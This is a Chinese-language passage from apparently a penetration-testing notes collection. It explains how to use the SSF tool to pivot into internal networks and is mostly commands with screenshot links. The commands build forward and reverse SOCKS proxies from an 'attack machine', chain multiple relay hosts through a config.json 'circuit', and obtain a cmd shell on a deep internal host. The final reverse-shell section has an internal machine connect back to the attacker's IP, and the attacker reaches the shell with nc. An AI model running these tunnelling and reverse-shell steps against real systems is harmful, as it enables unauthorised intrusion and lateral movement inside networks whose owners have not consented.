	https://github.com/securesocketfunneling/ssf/releases
  #### 正向socks代理
	边界机器执行：
	>ssfd.exe -p 1080 linux执行：./ssfd -p 1080
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/350.png)

	攻击机执行：
	>ssf.exe -D 12138 -p 1080 192.168.0.98(边界机器IP)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/351.png)

	本机配置proxychain或proxifier
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/352.png)
  #### 反向socks代理
	攻击机执行：
	>ssfd.exe -p 1080
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/353.png)

	内网机器执行：
	>ssf.exe -F 12138 -p 1080 192.168.0.106(攻击机IP)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/354.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/355.png)
  #### 多级级联
	多级内网机执行：
	>ssfd.exe -p 1080 -c config.json
	Json文件加入字段
	"circuit": [ 
	{"host": "A中继机IP", "port":"1080"}, 
	{"host": "B中继机IP", "port":"1080"} 
	],
	所有中继机执行：
	>ssfd.exe -p 1080 -c config.json
	边界机器执行：
	>ssf.exe -c config.json -p 1080 多级内网机IP -X 12138
	边界机执行：
	>nc.exe 127.0.0.1 12138即可获得多级内网机cmdshell
  #### 反弹shell
	攻击机执行：
	>ssfd.exe -p 1080 -c config.json
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/356.png)

	内网机器执行：
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/357.png)

	攻击机执行：
	>nc 127.0.0.1 12138
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/358.png)
